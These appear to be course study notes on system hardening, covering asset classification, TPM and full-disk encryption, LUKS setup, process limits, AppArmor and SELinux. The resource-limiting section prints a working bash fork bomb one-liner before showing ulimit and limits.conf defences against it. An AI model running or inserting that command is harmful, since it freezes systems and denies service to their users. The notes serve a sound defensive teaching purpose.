limits, solid network architecture, and fraud and audit controls.

### Hardening by Asset

#### Asset Management

##### Why asset management matters

Keeping assets safe requires a workable system that helps businesses
operate smoothly. Setting these systems up requires having detailed
knowledge of the assets in an environment. For example, a bank needs to
have money available each day to serve its customers. Equipment,
devices, and processes need to be in place to ensure that money is
available and secure from unauthorized access.

Organizations protect a variety of different assets. Some examples might
include:

-   Digital assets such as customer data or financial records.

-   Information systems that process data, like networks or software.

-   Physical assets which can include facilities, equipment, or
    supplies.

-   Intangible assets such as brand reputation or intellectual property.

Regardless of its type, every asset should be classified and accounted
for. As you may recall, **asset classification** is the practice of
labeling assets based on sensitivity and importance to an organization.
Determining each of those two factors varies, but the sensitivity and
importance of an asset typically requires knowing the following:

-   What you have

-   Where it is

-   Who owns it, and

-   How important it is

An organization that classifies its assets does so based on these
characteristics. Doing so helps them determine the sensitivity and value
of an asset.

##### Common asset classifications

Asset classification helps organizations implement an effective risk
management strategy. It also helps them prioritize security resources,
reduce IT costs, and stay in compliance with legal regulations.

The most common classification scheme is: restricted, confidential,
internal-only, and public.

-   **Restricted** is the highest level. This category is reserved for
    incredibly sensitive assets,  like need-to-know information.

-   **Confidential** refers to assets whose disclosure may lead to a
    significant negative impact on an organization.

-   **Internal-only** describes assets that are available to employees
    and business partners.

-   **Public** is the lowest level of classification. These assets have
    no negative consequences to the organization if they're released.

How this scheme is applied depends greatly on the characteristics of an
asset. It might surprise you to learn that identifying an asset's owner
is sometimes the most complicated characteristic to determine.

##### Challenges of classifying information

Identifying the owner of certain assets is straightforward, like the
owner of a building. Other types of assets can be trickier to identify.
This is especially true when it comes to information.

For example, a business might issue a laptop to one of its employees to
allow them to work remotely. You might assume the business is the asset
owner in this situation. But, what if the employee uses the laptop for
personal matters, like storing their photos?

Ownership is just one characteristic that makes classifying information
a challenge. Another concern is that information can have multiple
classification values at the same time. For example, consider a letter
addressed to you in the mail. The letter contains some public
information that's okay to share, like your name. It also contains
fairly confidential pieces of information that you'd rather only be
available to certain people, like your address. You'll learn more about
how these challenges are addressed as you continue through the program.

#### OS and software Hardening (best practices)

Hi there. In this video, we\'ll discuss operating system, or OS,
hardening and why it\'s essential to keep the entire network secure. The
operating system is the interface between computer hardware and the
user. The OS is the first program loaded when a computer turns on. The
OS acts as an intermediary between software applications and the
computer hardware. It\'s important to secure the OS in each system
because one insecure OS can lead to a whole network being compromised.
There are many types of operating systems, and they all share similar
security hardening practices. Let\'s talk about some of those security
hardening practices that are recommended to secure an OS.

Some OS hardening tasks are performed at regular intervals, like
updates, backups, and keeping an up-to-date list of devices and
authorized users. Other tasks are performed only once as part of
preliminary safety measures. One example would be configuring a device
setting to fit a secure encryption standard. Let\'s begin with OS
hardening tasks that are performed at a regular interval, such as patch
installation, also known as patch updates.

##### \[One-Time\] Cryptographic Hardware

###### Trusted Platform Module (TPM)

![A picture containing text, electronics Description automatically
generated](media/image615.png){width="5.237340332458443in"
height="2.726662292213473in"}

Welcome back. Let\'s dive right in. Another interesting application of
cryptography concepts, is the Trusted Platform Module or TPM. This is a
hardware device that\'s typically integrated into the hardware of a
computer, that\'s a dedicated crypto processor. TPM offers secure
generation of keys, random number generation, remote attestation, and
data binding and sealing. A TPM has unique secret RSA key burned into
the hardware at the time of manufacture, which allows a TPM to perform
things like hardware authentication. This can detect unauthorized
hardware changes to a system. Remote attestation is the idea of a system
authenticating its software and hardware configuration to a remote
system. This enables the remote system to determine the integrity of the
remote system. This can be done using a TPM by generating a secure hash
of the system configuration, using the unique RSA key embedded in the
TPM itself. Another use of this secret hardware backed encryption key is
data binding and sealing. It involves using the secret key to derive a
unique key that\'s then used for encryption of data. Basically, this
binds encrypted data to the TPM and by extension, the system the TPM is
installed in, sends only the keys stored in hardware in the TPM will be
able to decrypt the data. Data sealing is similar to binding since data
is encrypted using the hardware backed encryption key. But, in order for
the data to be decrypted, the TPM must be in a specified state. TPM is a
standard with several revisions that can be implemented as a discrete
hardware chip, integrated into another chip in a system, implemented in
firmware software or virtualize then a hypervisor. The most secure
implementation is the discrete chip, since these chip packages also
incorporate physical tamper resistance to prevent physical attacks on
the chip.

###### Secure Element

Mobile devices have something similar referred to as a secure element.
Similar to a TPM, it\'s a tamper resistant chip often embedded in the
microprocessor or integrated into the mainboard of a mobile device. It
supplies secure storage of cryptographic keys and provides a secure
environment for applications.

###### Trusted Execution Environment (TEE)

An evolution of secure elements is the Trusted Execution Environment or
TEE which takes the concept a bit further. It provides a full-blown
isolated execution environment that runs alongside the main OS. This
provides isolation of the applications from the main OS and other
applications installed there. It also isolates secure processes from
each other when running in the TEE. TPMs have received criticism around
trusting the manufacturer. Since the secret key is burned into the
hardware at the time of manufacture, the manufacturer would have access
to this key at the time. It is possible for the manufacturer to store
the keys that could then be used to duplicate a TPM, that could break
the security the module is supposed to provide. There\'s been one report
of a physical attack on a TPM which allowed a security researcher to
view and access the entire contents of a TPM. But this attack required
the use of an electron microscope and micron precision equipment for
manipulating a TPM circuitry. While the process was incredibly time
intensive and required highly specialized equipment, it proved that such
an attack is possible despite the tamper protections in place. You can
read more about it just after this video.

###### Full Disk Encryption (FDE)

We briefly discussed disk encryption earlier when we talked about
encryption at a high level. Now, it\'s time to dive deeper. Full-disk
encryption, or FDE, is an important factor in a defense in-depth
security model. It provides protection from some physical forms of
attack. As an IT support specialist, you likely assist with implementing
an FDE solution. If one doesn\'t exist already, help with migrating
between FDE solutions and troubleshoot issues with FDE systems, like
helping with forgotten passwords. So FDE is key. Systems with their
entire hard drives encrypted are resilient against data theft. They\'ll
prevent an attacker from stealing potentially confidential information
from a hard drive that\'s been stolen or lost. Without also knowing the
encryption password or having access to the encryption key, the data on
the hard drive is just meaningless gibberish. This is a very important
security mechanism to deploy for more mobile devices like laptops, cell
phones, and tablets. But it\'s also recommended for desktops and servers
too. Since disk encryption not only provides confidentiality but also
integrity. This means that an attacker with physical access to a system
can\'t replace system files with malicious ones or install malware.
Having the disk fully encrypted protects from data theft and
unauthorized tampering even if an attacker has physical access to the
disk. But in order for a system to boot if it has an FDE setup, there
are some critical files that must be accessible. They need to be
available before the primary disk can be unlocked and the boot process
can continue. Because of this, all FDE setups have an unencrypted
partition on the disk, which holds these critical boot files. Examples
include things like the kernel and bootloader, that are critical to the
operating system. These files are actually vulnerable to being replaced
with modified potentially malicious files by an attacker with physical
access. While it\'s possible to compromise a machine this way, it would
take a sophisticated and determined attacker to do it. There\'s also
protection against this attack in the form of the secure boot protocol,
which is part of the UEFI specification. Secure boot uses public key
cryptography to secure these encrypted elements of the boot process. It
does this by integrated code signing and verification of the boot files.
Initially, secure boot is configured with what\'s called a platform key,
which is the public key corresponding to the private key used to sign
the boot files. This platform key is written to firmware and is used at
boot-time to verify the signature of the boot files. Only files
correctly signed and trusted will be allowed to execute. This way, a
secure boot protects against physical tampering with the unencrypted
boot partition. There are first-party full-disk encryption solutions
from Microsoft and Apple called Bit Locker and FileVault 2 respectively.
There are also a bunch of third party and open source solutions. On
Linux, the dm-crypt package is super popular. There are also solutions
from PGP, TrueCrypt, VeraCrypt, and lots of others. Check out the
supplementary readings for a detailed list of FDE tools. Just pick your
poison or antidote, I should say.

![Diagram Description automatically
generated](media/image616.png){width="6.5in"
height="2.5493055555555557in"}

Full-disk encryption schemes rely on the secret key for actual
encryption and decryption operations. They typically password-protect
access to this key. And in some cases, the actual encryption key is used
to derive a user key, which is then used to encrypt the master key. If
the encryption key needs to be changed, the user key can be swapped out,
without requiring a full decryption and re-encryption of the data being
protected. This would be necessary if the master encryption key needs to
be changed. Password-protecting the key works by requiring the user
entry passphrase to unlock the encryption key. It can then be used to
access the protected contents on the disk. In many cases, this might be
the same as the user account password to keep things simple and to
reduce the number of passwords to memorize. When you implement a
full-disk encryption solution at scale, it\'s super important to think
about how to handle cases where passwords are forgotten. This is another
convenience tradeoff when using FDE. If the passphrase is forgotten,
then the contents of the disk aren\'t recoverable. Yikes! This is why
lots of enterprise disk encryption solutions have a key escrow
functionality. Key escrow allows encryption key to be securely stored
for later retrieval by an authorized party. So if someone forgets the
passphrase to unlock their encrypted disk for their laptop, the systems
administrators are able to retrieve the escrow key or recovery
passphrase to unlock the disk. It\'s usually a separate key passphrase
that can unlock the disk in addition to the user to find one. This
allows for recovery if a password is forgotten. The recovery key is used
to unlock the disk and boot the system fully. You should compare
full-disk encryption against file-based encryption. That\'s where only
some files or folders are encrypted and not the entire disk. This is
usually implemented as home directory encryption. It serves a slightly
different purpose compared to FDE. Home directory or file-based
encryption only guarantees confidentiality and integrity of files
protected by encryption. These setups usually don\'t encrypt system
files because there are often compromises between security and
usability. When the whole disk isn\'t encrypted, it\'s possible to
remotely reboot a machine without being locked out. If you reboot a
full-disk encrypted machine, the disk unlock password must be entered
before the machine finishes booting and is reachable over the network
again. So while file-based encryption is a little more convenient, it\'s
less protected against physical attacks. An attacker can modify or
replace core system files and compromise the machine to gain access to
the encrypted data. This is a good example of why understanding threats
and the risks these threats represent is an important part in designing
a security architecture and choosing the right defenses. In our next
lesson, we\'ll cover application hardening. I\'ll see you there.

**TPMs and FDE**

TPMs are most commonly used to ensure platform integrity, preventing
unauthorized changes to the system either in software or hardware, and
full disk encryption utilizing the TPM to protect the entire contents of
the disk. Full Disk Encryption or FDE, as you might have guessed from
the name, is the practice of encrypting the entire drive in the system.
Not just sensitive files in the system. This allows us to protect the
entire contents of the disk from data theft or tampering. Now, there are
a bunch of options for implementing FDE. Like the commercial product
PGP, Bitlocker from Microsoft, which integrates very well with TPMs,
Filevault 2 from Apple, and the open source software dm-crypt, which
provides encryption for Linux systems. An FDE configuration will have
one partition or logical partition that holds the data to be encrypted.
Typically, the root volume, where the OS is installed. But, in order for
the volume to be booted, it must first be unlocked at boot time. Because
the volume is encrypted, the BIOS can\'t access data on this volume for
boot purposes. This is why FDE configurations will have a small
unencrypted boot partition that contains elements like the kernel,
bootloader and a netRD. At boot time, these elements are loaded which
then prompts the user to enter a passphrase to unlock the disk and
continue the boot process. FDE can also incorporate the TPM, utilizing
the TPM encryption keys to protect the disk. And, it has platform
integrity to prevent unlocking of the disk if the system configuration
is changed. This protects against attacks like hardware tampering, and
disk theft or cloning. Before we wrap up this module on encryption, I
wanted to touch base on the concept of random. Earlier, when we covered
the various encryption systems, one commonality kept coming up that
these systems rely on. Did you notice what it was? That\'s okay if you
didn\'t. It\'s the selection of random numbers. This is a very important
concept in encryption because if your number selection process isn\'t
truly random, then there can be some kind of pattern that an adversary
can discover through close observation and analysis of encrypted
messages over time. Something that isn\'t truly random is referred to as
pseudo-random. It\'s for this reason that operating systems maintain
what\'s referred to as an entropy pool. This is essentially a source of
random data to help seed random number generators. There\'s also
dedicated random number generators and pseudo-random number generators,
that can be incorporated into a security appliance or server to ensure
that truly random numbers are chosen when generating cryptographic keys.
I hope you found these topics in cryptography interesting and
informative. I know I did when I first learned about them. In the next
module, we\'ll cover the three As of security, authentication,
authorization and accounting. These three As are awesome and I\'ll tell
you why in the next module. But before we get there, one final quiz on
the cryptographic concept we\'ve covered so far.

###### Creating an Encrypted filesystem in Linux (LUKS and cryptsetup)

1.  Create a mounting point

![A picture containing text, clock, gauge Description automatically
generated](media/image617.png){width="2.6721227034120734in"
height="0.3615944881889764in"}

2.  Create a partition -- and do not create a filesystem on it (yet).
    Make sure it isn't moutned.

3.  Wipte the partition with shred

    1.  ![Text Description automatically
        generated](media/image618.png){width="6.5in"
        height="0.8104166666666667in"}

4.  Format a partition with luks (enter a passphrase)

![Text Description automatically
generated](media/image619.png){width="6.5in"
height="1.8763888888888889in"}

\^ you can add "v" for verbose.

If you run lsblk -f, by this point you should the filestem type is
crypto_LUKS

![Text Description automatically
generated](media/image620.png){width="4.256760717410324in"
height="2.26670384951881in"}

5.  Open the drive for accessing (and give is a name which we can
    referenced in its open state -- "secretdisk")

![](media/image621.png){width="6.5in" height="0.44930555555555557in"}

Can also use "luksOpen" instead of "open".

Run ls -f again to see that your secretdisk is listing under the
partition now

![](media/image622.png){width="4.427701224846894in"
height="0.41672462817147854in"}

That name you gave it will be where the disk exists in the
**/dev/mapper/\<newname\>** dir.

So you should see your new drive name using "ls" on the /dev/mapper dir.

6.  Create a filesystem on this new location **/dev/mapper/\<newname\>**

![Text Description automatically
generated](media/image623.png){width="6.355053587051619in"
height="2.4170034995625547in"}

7.  Mount this drive on the folder you made in step one

![A screenshot of a computer Description automatically generated with
medium confidence](media/image624.png){width="6.5in"
height="3.5972222222222223in"}

8.  Use away!

9.  To put it away so to speak... unmount it first

![](media/image625.png){width="4.423762029746282in"
height="0.3114588801399825in"}

10. To make sure it's not available anymore in it's unencrypted format,
    close it

11. ![](media/image626.png){width="6.5in" height="0.3055555555555556in"}

> Now there would no way to gain access to that disk again without the
> password.

**Auto Mount on Boot**

1.  Use blkid to grab the UUID of the luks partition

    1.  This would be the luks partition itself -- not the filesystem
        set on top

    2.  ![](media/image627.png){width="6.5in"
        height="0.20347222222222222in"}

2.  Create/open /etc/crypttab

    1.  Enter the name for the uncrypted drive, the UUID, and a hypen or
        the word "none" which will initiate a password prompt when
        booting the machine to unencrypt the drive.

> ![](media/image628.png){width="6.5in" height="0.25625in"}

3.  Lastly, update /etc/fstab with the drive to open and where to mount
    it (along with the fs set)

![](media/image629.png){width="6.5in" height="0.20694444444444443in"}

\^ you can replace "defaults" with "nofail" if you want. This will mean
that if the volume is not detected (i.e. if the volume isn't able to
decrypt & mount on boot) then no errors will be thrown and the rest of
the boot process can continue uninterrupted.

###### More with luks and cryptsetup

![Graphical user interface, text, email Description automatically
generated](media/image630.png){width="5.760205599300088in"
height="0.9914195100612423in"}

![Graphical user interface, application, website Description
automatically generated](media/image631.png){width="6.5in"
height="1.0284722222222222in"}

##### \[One-Time\] Resource Limiting: Fork Bomb (Linux)

###### Fork bomb

This is a fork bomb...

:(){ :\|: &};:

\^ it's a bash function that exponentially and recusrsively calls itsels
-- locking the system by hoggin all the usable resources and forcing a
reboot to get out of this. This is efectively a local DDoS attack.
POSIX-based UNIX systems (as opposed to Bash) only accept alphanumeric
characters as a function name so the colon would work.

Features like **ulimit** and **sysconf** set limits on what can be used
-- killing the process(es) after they reach a certain threshold before
they wreck havom on the entore system and choke the machine altogether.

###### ulimit commmand

Use ulimit to set a limit of certain usable resources .

![Text Description automatically
generated](media/image632.png){width="6.5in"
height="4.895833333333333in"}

**View all**: ulimit -a

![A black screen with white text Description automatically generated
with low confidence](media/image633.png){width="5.0111154855643045in"
height="3.427561242344707in"}

Ulimit is only active per session. To apply this at the system-level we
need to look at **sysconf** -- meaning it's likely preferable to edit
the **/etc/security/limits** file.

**Max number of user processes**

*get*

![](media/image634.png){width="3.7192694663167103in"
height="0.3854702537182852in"}

*set*

![Text Description automatically
generated](media/image635.png){width="4.042230971128609in"
height="0.9793033683289589in"}

Best to also update sysconf as well to cover all bases to apply this
limit.

![Timeline Description automatically generated with low
confidence](media/image636.png){width="6.5in"
height="2.6013888888888888in"}

###### Sysconf

Pam-enabled systems can utilize this more secure method.

File: **/etc/security/limits.conf**

**Note:** In FreeBSD systems, the system administrator can put limits in
**/etc/login.conf**

**Limiting number of processes (nproc) to 30 with a hard limit**

![Graphical user interface, text Description automatically
generated](media/image637.png){width="5.980001093613298in"
height="2.68787510936133in"}

\^ set on all users and explicitly on root.

***From stack overflow***

![Graphical user interface, text, application, email, Teams Description
automatically generated](media/image638.png){width="6.5in"
height="3.173611111111111in"}

**IMPORTANT!**: MUST REBOOT FOR CHANGES TO TAKE EFFECT!

##### *\[Regular Intervals\] Patch Updates*

A patch update is a software and operating system, or OS, update that
addresses security vulnerabilities within a program or product. Now
we\'ll discuss patch updates provided to the company by the OS software
vendor. With patch updates, the OS should be upgraded to its latest
software version. Sometimes patches are released to fix a security
vulnerability in the software. As soon as OS vendors publish a patch and
the vulnerability fix, malicious actors know exactly where the
vulnerability is in systems running the out-of-date OS. This is why
it\'s important for organizations to run patch updates as soon as they
are released. For example, my team had to perform an emergency patch to
address a recent vulnerability found in a commonly used programming
library. The library is used almost everywhere, so we had to quickly
patch most of our servers and applications to fix the vulnerability. The
newly updated OS should be added to the baseline configuration, also
called the baseline image. A baseline configuration is a documented set
of specifications within a system that is used as a basis for future
builds, releases, and updates. For example, a baseline may contain a
firewall rule with a list of allowed and disallowed network ports. If a
security team suspects unusual activity affecting the OS, they can
compare the current configuration to the baseline and make sure that
nothing has been changed.

##### \[Regular Intervals\] Software Disposal

Another hardening task performed regularly is hardware and software
disposal. This ensures that all old hardware is properly wiped and
disposed of. It\'s also a good idea to delete any unused software
applications since some popular programming languages have known
vulnerabilities. Removing unused software makes sure that there aren\'t
any unnecessary vulnerabilities connected with the programs that the
software uses.

##### \[Regular Intervals\] Strong Password Policy

The final OS hardening technique that we\'ll discuss is implementing a
strong password policy. Strong password policies require that passwords
follow specific rules. For example, an organization may set a password
policy that requires a minimum of eight characters, a capital letter, a
number, and a symbol. To discourage malicious actors, a password policy
usually states that a user will lose access to the network after
entering the wrong password a certain number of times in a row. Some
systems also require multi-factor authentication, or MFA. MFA is a
security measure which requires a user to verify their identity in two
or more ways to access a system or network. Ways of identifying yourself
include something you know, like a password, something you have like an
ID card, or something unique about you, like your fingerprint.

##### \[Regular Intervals\] Disabling unnecessary components

Think back to the beginning of this course when we talked about attacks
and vulnerabilities. The special class of vulnerabilities we discussed
called zero-day vulnerabilities are unique since they\'re unknown until
they\'re exploited in the wild. The potential for these unknown flaws is
something you should think about when looking to secure your company\'s
systems and networks. Even though it\'s an unknown risk, it can still be
handled by taking measures to restrict and control access to systems.
Our end goal overall is risk reduction.

**Threat vector**: method used by an attacker to gain access to a
victim's machine.

Two important terms to know when talking about security risks are
**attack vectors** and **attack surfaces**. An attack vector is a method
or mechanism by which an attacker or malware gains access to a network
or system. Some attack vectors are email attachments, network protocols
or services, network interfaces, and user input. These are different
approaches or paths that an attacker could use to compromise a system if
they\'re able to exploit it. An Attack Surface is the sum of all the
different attack vectors in a given system. Think of this as the
combination of all possible ways an attacker could interact with our
system, regardless of known vulnerabilities. It\'s not possible to know
of all vulnerabilities in the system. So, make sure to think of all
avenues that an outside actor could interact with our systems as a
potential Attack Surface. The main takeaway here is to keep our Attack
Surfaces as small as possible. This reduces the chances of an attacker
discovering an unknown flaw and compromising our systems. There are lots
of approaches you can use as an IT support specialist to reduce Attack
Surfaces. All of them boil down to simplifying systems and services. The
less complex something is, the less likely there will be undetected
flaws. So, make sure to disable any extra services or protocols. If
they\'re not totally necessary, then get them out of there. Every
additional surface that\'s operating represents additional Attack
Surfaces, that could have an undiscovered vulnerability. That
vulnerability could be exploited and lead to compromise. This concept
also applies to access and ACLs. Only allow access when totally
necessary. So, for example, it\'s probably not necessary for employees
to be able to access printers directly from outside of the local
network. You can just adjust firewall rules to prevent that type of
access. Another way to keep things simple is to reduce your software
deployments. Instead of having five different software solutions to
accomplish five separate tasks, replace them with one unified solution,
if you can. That one solution should require less complex code, which
reduces the number of potential vulnerabilities. You should also make
sure to disable unnecessary or unused components of software and systems
deployed. By disabling features not in use, you\'re reducing even more
tech services, even more. You\'re not only reducing the number of ways
an attacker can get in, but you\'re also minimizing the amount of code
that\'s active. It\'s important to take this approach at every level of
systems and networks under your administration. It might seem obvious to
take these measures on critical networking infrastructure and servers,
but it\'s just as important to do this for desktop and laptop platforms
that your employees use. Lots of consumer operating systems ship a bunch
of default services and software-enabled right out of the box, that you
probably won\'t be using in an enterprise network or environment. For
example, Telnet access for a managed switch has no business being
enabled in a real-world environment. You should disable it immediately
if you find it on the device. Any vendor-specific API access should also
be disabled if you don\'t plan on using these services or tools. They
might be harmless especially if you set up strong firewall rules and
network ACLs. This one service might represent a fairly low risk, but
why take any unnecessary risk at all? Remember, the defense in depth
concept is all about risk mitigation and implementing layers of
security. Now, let\'s think about the layered approach to security. What
if our access control measures are bypassed or fail, in some unforeseen
way? As an IT support specialist, this is exactly what you want to think
about. How do we keep this component secure if the security systems
above it have failed?

##### \[Regular Intervals\] Scanning for Malware with Process Explorer (Windows)

<https://www.youtube.com/watch?v=RnPtuTbqzd4>

##### Quiz Question

![Graphical user interface, text, application, letter, email Description
automatically generated](media/image639.png){width="4.729166666666667in"
height="7.041666666666667in"}

![Text, application, letter, email Description automatically
generated](media/image640.png){width="4.854166666666667in"
height="5.604166666666667in"}

![Text Description automatically
generated](media/image641.png){width="4.90625in"
height="8.229166666666666in"}

![Graphical user interface, text, application Description automatically
generated](media/image642.png){width="4.947916666666667in"
height="8.145833333333334in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image643.png){width="4.65625in"
height="2.2708333333333335in"}

#### Application Security \[Linux\]

##### AppArmor (Ubuntu)

**Check if installed:**

sudo aa-unconfined

**Installation:**

![A picture containing logo Description automatically
generated](media/image644.png){width="2.5740562117235344in"
height="0.3725601487314086in"}

Use **aa-** to see all programs we can use to manipulate apparmor:

![Text Description automatically
generated](media/image645.png){width="6.5in"
height="1.0930555555555554in"}

###### Overview/Usage

![Text Description automatically generated with medium
confidence](media/image646.png){width="4.4295975503062115in"
height="0.8158792650918635in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image647.png){width="6.375890201224847in"
height="2.427422353455818in"}

![A picture containing table Description automatically
generated](media/image648.png){width="5.615367454068242in"
height="7.396865704286964in"}

###### View active profiles

aa-status

any profiles you see in "complain" mode mean that these profiles will
only report (by writing log files) if a program violates it's policies
whereas enforce mode will actually stop that program.

![](media/image649.png){width="4.534955161854768in"
height="0.2569575678040245in"}

###### See if we already have a profile created for a given service

/etc/apparmor./

![Text Description automatically
generated](media/image650.png){width="6.5in"
height="1.3458333333333334in"}

\^ those files will correspond to existing service paths if a profile is
installed for a given service. For example, if there's a profiles for
apache2 (which lives at **/usr/sbin/apache2**) then there should exist a
file in this dir name **usr.sbin.apache2** -- that tells us we already
have a profile installed for apache2.

###### Create a profile

aa-status \<path to app\>

![](media/image651.png){width="5.264159011373578in"
height="0.25001312335958004in"}

This output a profiletemplate:

![Text Description automatically
generated](media/image652.png){width="4.88737532808399in"
height="3.254595363079615in"}

You can use this template to create a file at
/etc/apparmor.d/usr.local.bin.\<app_name\> .

Eeven better, you just redirect this template to the destination and
edit that:

![](media/image653.png){width="6.5in" height="0.3229166666666667in"}

Note: for the path name of the app, replace any forward-slashes with
dots.

It should be noted that a blank template doesn't have any permissions
set on it.

###### Activate a profile

apparmor_parser -r \<profile path\>

![](media/image654.png){width="6.5in" height="0.3576388888888889in"}

\^ this reads the profile into the kernel and since the blank template
had no permissions, this means trying to call to app now should throw a
permissions error as AppArmor is now in control of setting permissions
on this app and the associated profile has no permissions set (yet).

![](media/image655.png){width="6.5in" height="0.47847222222222224in"}

###### Log permission errors

Because of the above, trying to call an app without permissions set
where that app has an associated app armor profile, all permission-error
details will be logged.

You can view these logs with (**aa-logprof**):

![Text Description automatically
generated](media/image656.png){width="6.5in"
height="2.3569444444444443in"}\^ Applying and saving these actions will
update the profile for this application:

![](media/image657.png){width="6.5in" height="0.5979166666666667in"}

You can cat the profiles to view these changes

![](media/image658.png){width="6.5in" height="0.21388888888888888in"}

Continue the process of view errors and updating permissions until you
are able to run thr program without issue.

##### SELinux (Process security) \[Redhat/Cent os\]

This is ideal for Redhat and Cent OS and many issues have been noted
with some distros like Ubuntu. AppArmor is recommended for Ubuntu.

![Text Description automatically
generated](media/image659.png){width="3.55257874015748in"
height="0.8647036307961505in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image660.png){width="6.094600831146106in"
height="2.1878051181102363in"}

Can be installed with:

sudo apt install policycoreutils

![Text, whiteboard Description automatically
generated](media/image661.png){width="6.5in"
height="3.6083333333333334in"}

Key terms:

-   **Domain** : Describe the relationship between objects and whether
    or not they have access each other (for example web servers domain).

    -   **Object** : Can be files or ports.

        -   **Types** : Describe where an object can go or where it can
            do.

    -   **Subject** : A linux process (exists within a domain).

        -   **(User) Role** : A role describes which subjects a user has
            access to. Every user has a role.

        -   **SELinux Users** : All system users are mapped to one or
            more SELinux users.

        -   **System User** : A linux user either created or
            process-spawned.

**Config file**: /etc/selinux/config

/![Text Description automatically
generated](media/image662.png){width="6.5in"
height="2.060416666666667in"}

###### Overview/Usage

![Graphical user interface, text Description automatically
generated](media/image663.png){width="4.923863735783027in"
height="7.77817804024497in"}

menu\^ You may need to instead update the config file to "enforcing"
then reboot the machine.

![Graphical user interface, text, application, chat or text message
Description automatically
generated](media/image664.png){width="4.819691601049869in"
height="1.437574365704287in"}

**Can also use binary digits**

![Graphical user interface, text Description automatically
generated](media/image665.png){width="6.222541557305337in"
height="2.305673665791776in"}

**View what's currently being allowed**

![](media/image666.png){width="3.0834919072615925in"
height="0.3125164041994751in"}

To change contexts at the file-level use **chcon** (change context) and
restorecon (restore context).

**View SELinux sesttings on files (ls -z)**

![](media/image667.png){width="6.5in" height="0.40625in"}

**Audit2allow**

![Text Description automatically generated with low
confidence](media/image668.png){width="6.5in" height="1.6125in"}

The \"audit2allow\" command generates SELinux policy allow/dontaudit
rules from logs of denied operations, making it the correct answer. 

**Disable SELinux**

The sudo nano /etc/setlinux/config command and setting the SELINUX
variable to disabled are used to disable SELinux.

![](media/image669.png){width="5.240314960629921in"
height="0.41672462817147854in"}

![Text Description automatically
generated](media/image670.png){width="6.000837707786527in"
height="5.323659230096238in"}

![A picture containing graphical user interface Description
automatically generated](media/image671.png){width="5.563276465441819in"
height="7.678155074365704in"}

![A picture containing table Description automatically
generated](media/image672.png){width="6.0737642169728785in"
height="7.511465441819772in"}

![Text Description automatically
generated](media/image673.png){width="5.980001093613298in"
height="4.917352362204724in"}

###### Policies

**Targeted policy** subjects and objects run in an unconfined
environment. The untargeted subjects and objects will operate on the DAC
method, and the targeted daemons will operate on the MAC method.

The **minimum policy** is similar to the targeted policy in that
subjects and objects run in an unconfined environment but load less
configuration into memory. This policy category is appropriate for small
devices, such as phones, and experimentation with SELinux.

A **strict policy** is a policy where every subject and object of the
system is enforced to operate on the Mandatory Access Control (MAC)
method.

###### System Booleans

System Boolean values enable you to change policy configurations at
runtime without actually writing the policy directly. 

**View settings defined our policies**

![](media/image674.png){width="4.722465004374453in"
height="0.4653018372703412in"}

**Turn a setting on (cifs in this example)**

*Find it*

![Text Description automatically generated with medium
confidence](media/image675.png){width="6.5in"
height="2.8854166666666665in"}

*Set it (p for permanent, 1 for 'on')*

![](media/image676.png){width="5.416176727909011in"
height="0.36860126859142606in"}

\^ applies at the system level.

The **autorelabel** feature of SELinux allows sysadmins to cause
contexts to be reset throughout the filesystem

###### Granting access : Overview and working example

If you deal with Red Hat or CentOS, you\'re probably familiar with
SELinux, or Security Enhanced Linux. And unfortunately, one of the
things that SELinux is known for is giving system administrators a real
tough time. And I have to admit, in the past, I\'ve been a person who
has just disabled SELinux, because it\'s been frustrating.

But there is a better way, because SELinux is a really awesome and
powerful security tool that you should not just disable. So I\'m going
to go through and show you how to do some troubleshooting so you can
maybe use SELinux in a way that\'s going to be beneficial, and not just
annoying.

So SELinux is basically just a way for the Linux to make sure that there
aren\'t any programs that are doing things they shouldn\'t be doing. And
how that works is there\'s a list of contexts, or labels, that specify
when a program can or can\'t use a particular port on a system, or a
particular file on a system.

And this is a very complicated and very robust system. We\'re just going
to touch the surface of it to show you some of the things you might
encounter on the command line. So basically, there\'s a long list of
things that a particular application is allowed to access.

And some of those things, like I said, are ports. Some of those things
are files. And these contexts are put onto the ports and the files using
labels. So here\'s what our scenario\'s going to be. Normally, a web
server runs on port 80, or port 443 if it\'s going to be something that
is SSL.

But we\'re going to say port 80 for a standard HTTP port. What if we
wanted to serve something from a port that is not standard? Well,
obviously, Apache can do that, but SELinux, our supervisor over here, is
not going to allow Apache to serve from a port that it shouldn\'t
normally have access to, and it\'s just going to fail.

So let\'s actually do that. Let\'s set up Apache to run on a
non-standard port and see what happens, and then see how to fix it. Now,
here I\'m on a CentOS machine, and I have Apache installed. So if we
open up a web browser and we just go to http://localhost, it\'s going to
show us that, sure enough, Apache test server is installed.

It\'s on port 80. I didn\'t specify port 80, because that\'s a default.
But if we look at port 80, sure enough, there it is. That\'s what it\'s
running on. But if we want to run this on a non-standard port\-- in
fact, let\'s look. I\'m in the current working directory of\-- OK, the
httpd, or the Apache configuration folder.

Let\'s edit sudo vi httpd, and I want to look for where it says Listen.
OK, right here it\'s going to be listening on port 80\-- which is one of
the ports, obviously, that it\'s allowed to using SELinux. So let\'s,
instead, say, listen on port 8888. Now, this is not a privileged port.

This is not a port below 1024. So ideally, it should be able to do this.
We should just be able to allow it to listen on port 8888, then serve
out the web page on that port. So we would just say sudo systemctl
restart httpd, and it should just work\-- except it didn\'t.

\[GROAN\] sudo systemctl status httpd, and let\'s see. We had some
issues here. If we stretch out this window\-- let\'s do that again so we
can see it stretched out. It looks like what happened is it failed
because it didn\'t have permission to make a socket on port 8888\--
which makes sense if SELinux doesn\'t allow that.

Now, we can see what SELinux allows if we type sudo semanage port -l.
And then it\'s going to give a whole list, so I just want to grep for
http. Oh, I meant grep for, not\-- grep for http. And it\'s going to
show us, with this label\-- http_cache_port or http_port tcp ports, and
here all the ports that Apache is allowed to listen on.

![Table Description automatically generated with low
confidence](media/image677.png){width="6.5in"
height="0.9541666666666667in"}

But notice port 8888 is not there. Now, we could have switched it to
port 8008 or 8009, and it would\'ve worked just fine. But notice 8888 is
not on here. Now, we could disable SELinux and it would work, but
that\'s not the best way to go about it. What we could do instead is add
port 8888 to the SELinux context that will be allowed to use it here.

So what we would do is sudo semanage, but this time port -a for add. The
type is going to be that http port, so http port type protocol is going
to be tcp. And then the actual port is 8888. Press Enter.

![](media/image678.png){width="6.5in" height="0.20069444444444445in"}

This will take it a minute. And it\'s going to add it so that Apache is
allowed to use port 8888.

Now, if we do that list again, where we grep for http, we should see a
change. And sure enough, now http port is allowed on port 8888.

